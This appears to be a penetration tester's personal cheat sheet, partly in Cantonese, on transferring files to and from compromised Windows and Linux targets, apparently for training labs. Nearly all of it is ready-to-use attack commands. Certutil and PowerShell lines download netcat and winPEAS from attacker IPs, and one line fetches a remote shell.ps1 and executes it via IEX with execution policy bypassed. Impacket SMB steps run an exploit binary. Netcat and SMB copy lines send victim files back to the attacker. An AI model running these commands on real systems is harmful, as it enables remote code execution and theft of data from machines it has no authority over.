# File Transfer

## Windows

- VBScript (in Windows XP, 2003) and PowerShell (in Windows 7, 2008, and above) 
- 新機可以用curl
- `certutil.exe -urlcache -split -f "http://10.11.6.12/winPEASany.exe" winp.exe`
- Powershell : downloadfile係會save, IEX + downloadstring係唔會save,但會execute
    ```powershell
    powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://192.168.19.71/nc.exe', 'nc.exe')

    powershell -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://192.168.19.71/shell.ps1')"

    powershell -c "Invoke-WebRequest "http://10.11.6.12/winPEAS.bat" -OutFile "c:\Windows\Temp\w.bat"
    ```
- smbserver
```
kali to windows(smbsverver):
kali : impacket-smbserver share files
windows : dir \\10.10.14.3\share\ms11-046.exe (show the dir)
windows : \\10.10.14.3\share\ms11-046.exe     (run the exe)
windows : copy \\10.10.14.3\share\ms11-046.exe (download the exe)
copy config.txt \\10.10.14.6\share\config.txt    ( from victim to kali)
```

- Netcat
```
#transfer file from target(linux) to our machine
kali: nc -nvlp 4444 > file
target: nc 10.10.14.5 4444 < /usr/local/bin/backup
```

## Linux

- wget
- curl
- scp

```
scp charix@10.10.10.84:/home/charix/secret.zip ./
```